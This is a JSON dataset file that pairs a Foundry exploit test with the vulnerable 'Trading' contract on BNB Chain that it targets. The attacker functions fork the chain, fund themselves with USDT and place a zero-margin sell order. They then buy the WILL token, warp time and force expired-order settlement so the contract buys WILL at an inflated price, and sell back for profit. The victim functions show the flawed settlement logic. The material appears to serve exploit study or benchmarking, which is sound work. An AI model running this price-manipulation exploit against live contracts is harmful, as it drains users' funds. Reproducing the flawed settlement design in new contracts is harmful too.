[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        USDT.approve(address(trading), type(uint256).max);\n        trading.placeSellOrder(71_000 ether, 0, 0);\n        swap_token_to_token(address(USDT), address(will), 88_000 ether);\n        /////step---2\n        vm.warp(block.timestamp + 20);\n        trading.updateExpiredOrders();\n        trading.settleExpiredPositions(0);\n        uint256 willamount = will.balanceOf(address(this));\n        swap_token_to_token(address(will), address(USDT), willamount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 39_979_796);\n        deal(address(USDT), address(this), 180_000 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker USDT before exploit\", USDT.balanceOf(address(this)), 18);\n        attack();\n        emit log_named_decimal_uint(\"[End] Attacker USDT after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Trading",
    "source_type": "victim_contract",
    "function_name": "placeSellOrder",
    "original_code": "    function placeSellOrder(uint256 usdtAmount, uint256 margin, uint256 minUsdtReceived) public nonReentrant {\n        require(IERC20(USDT).transferFrom(msg.sender, address(this), usdtAmount + margin), \"USDT transfer failed\");\n\n        // \u8c03\u7528\u51fd\u6570\u83b7\u53d6\u6d41\u52a8\u6027\u6c60\u50a8\u5907\n        (uint reserveUSDT, uint reserveToken) = getReserves();\n\n        // \u8ba1\u7b97\u51fa\u552e\u4ee3\u5e01\u53ef\u83b7\u5f97\u7684USDT\u6570\u91cf\n        uint256 tokenAmount = calculateTokenAmountToSell(usdtAmount, reserveUSDT, reserveToken);\n\n        // \u6388\u6743PancakeSwap\u8def\u7531\u5668\u5408\u7ea6\u4ece\u5408\u7ea6\u4e2d\u8f6c\u51fa\u8ba1\u7b97\u51fa\u7684\u4ee3\u5e01\u6570\u91cf\n        require(IERC20(token).approve(address(pancakeSwapRouter), tokenAmount), \"Approve failed\");\n\n        // \u8bb0\u5f55\u4ea4\u6362\u524d\u7684\u4ee3\u5e01\u4f59\u989d\n        uint256 initialTokenBalance = IERC20(token).balanceOf(address(this));\n\n        // \u8bbe\u7f6e\u4ea4\u6613\u8def\u5f84\u4ece\u4ee3\u5e01\u5230USDT\n        address[] memory path = new address[](2);\n        path[0] = token;\n        path[1] = USDT;\n\n        // \u6267\u884c\u4ea4\u6362\uff0c\u5356\u51fa\u8ba1\u7b97\u51fa\u7684\u4ee3\u5e01\u6570\u91cf\n        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            tokenAmount, // \u8981\u4ea4\u6362\u7684\u4ee3\u5e01\u6570\u91cf\n            minUsdtReceived, // \u6700\u5c0f\u63a5\u53d7\u7684USDT\u6570\u91cf\n            path,\n            address(this), // \u786e\u4fddUSDT\u8fd4\u56de\u5230\u5408\u7ea6\u5730\u5740\n            block.timestamp + 300 // \u4ea4\u6613\u622a\u6b62\u65f6\u95f4\n        );\n\n        // \u8bb0\u5f55\u4ea4\u6362\u540e\u7684\u4ee3\u5e01\u4f59\u989d\n        uint256 finalTokenBalance = IERC20(token).balanceOf(address(this));\n\n        // \u5b9e\u9645\u5356\u51fa\u7684\u4ee3\u5e01\u6570\u91cf\n        uint256 actualTokenSold = initialTokenBalance - finalTokenBalance;\n\n        // \u521b\u5efa\u505a\u7a7a\u8ba2\u5355\n        uint256 orderId = nextSellOrderId++;\n\n        uint256 secondsExtended = margin.mul(1e10).div(usdtAmount.mul(INTEREST_PER_USDT_PER_SECOND));\n        uint256 closeTime = block.timestamp + secondsExtended;\n\n        sellOrders[orderId] = SellOrder({\n            usdtShorted: usdtAmount,\n            margin: margin,\n            tokenAmount: actualTokenSold, // \u5b9e\u9645\u5356\u51fa\u7684\u4ee3\u5e01\u6570\u91cf\n            priceAtTimeOfSale: calculatePrice(usdtAmount, actualTokenSold),\n            user: msg.sender,\n            isActive: true,\n            openTime: block.timestamp,\n            closeTime: closeTime\n        });\n\n        // \u8bb0\u5f55\u7528\u6237\u7684\u6cbd\u7a7a\u8ba2\u5355\n        ownerToOrderIds[msg.sender].push(orderId);\n        activeOrders[orderId] = true;\n        emit SellOrderPlaced(orderId, msg.sender, actualTokenSold);\n    }\n\n    // \u8ba1\u7b97\u4ef7\u683c\u7684\u5185\u90e8\u51fd\u6570\n",
    "description": ""
  },
  {
    "contract/interface": "Trading",
    "source_type": "victim_contract",
    "function_name": "settleExpiredPositions",
    "original_code": "    function settleExpiredPositions(uint256 minTokensToReceive) public nonReentrant {\n        require(expiredNotClosedUSDT > 0, \"No funds to settle positions\");\n\n        uint256 usdtAvailable = IERC20(USDT).balanceOf(address(this));\n        require(usdtAvailable >= expiredNotClosedUSDT, \"Insufficient USDT available\");\n\n        // \u5b9a\u4e49PancakeSwap\u4ea4\u6613\u8def\u5f84\n        address[] memory path = new address[](2);\n        path[0] = USDT;\n        path[1] = token;\n\n        // \u6267\u884c\u4ee3\u5e01\u8d2d\u4e70\n        IERC20(USDT).approve(address(pancakeSwapRouter), expiredNotClosedUSDT);\n        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            expiredNotClosedUSDT,\n            minTokensToReceive, // \u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u6700\u4f4e\u63a5\u53d7\u4ee3\u5e01\u6570\u91cf\uff0c\u6216\u7531\u524d\u7aef\u4f20\u5165\n            path,\n            address(this),\n            block.timestamp + 300 // 5\u5206\u949f\u7684\u4ea4\u6613\u7a97\u53e3\n        );\n        \n        // \u91cd\u7f6e\u7edf\u8ba1\u53d8\u91cf\n        expiredNotClosedUSDT = 0; // \u91cd\u7f6e\u5df2\u5904\u7406\u7684USDT\u8ba1\u6570\u5668\n    }\n\n    //\u8d28\u62bc\u6316\u77ff\n",
    "description": ""
  },
  {
    "contract/interface": "Trading",
    "source_type": "victim_contract",
    "function_name": "updateExpiredOrders",
    "original_code": "    function updateExpiredOrders() public {\n        uint256 total = 0;\n        uint256 processedCount = 0;\n        for (uint256 orderId = lastProcessedOrderId; orderId < nextSellOrderId && processedCount < batchSize; orderId++) {\n            if (activeOrders[orderId] && sellOrders[orderId].closeTime < block.timestamp) {\n                uint256 totalPosition = sellOrders[orderId].usdtShorted;\n                uint256 additionalFunds = totalPosition.mul(80).div(100); // \u8ba1\u7b970.8\u500d\u7684\u989d\u5916\u5934\u5bf8\n                total += totalPosition + additionalFunds;\n                \n                delete activeOrders[orderId]; // \u5220\u9664\u5df2\u5904\u7406\u7684\u8ba2\u5355\n                processedCount++;\n            }\n        }\n        lastProcessedOrderId += processedCount; // \u66f4\u65b0\u6e38\u6807\n        expiredNotClosedUSDT = total; // \u66f4\u65b0\u7edf\u8ba1\u53d8\u91cf\n\n        // \u68c0\u67e5\u662f\u5426\u9700\u8981\u91cd\u7f6e\u6e38\u6807\n        if (lastProcessedOrderId >= nextSellOrderId) {\n            lastProcessedOrderId = 0; // \u91cd\u7f6e\u6e38\u6807\u5230\u5f00\u59cb\n        }\n    }\n\n    //\u516c\u5171\u8c03\u7528\u7ed3\u7b97\u5e73\u4ed3\n",
    "description": ""
  }
]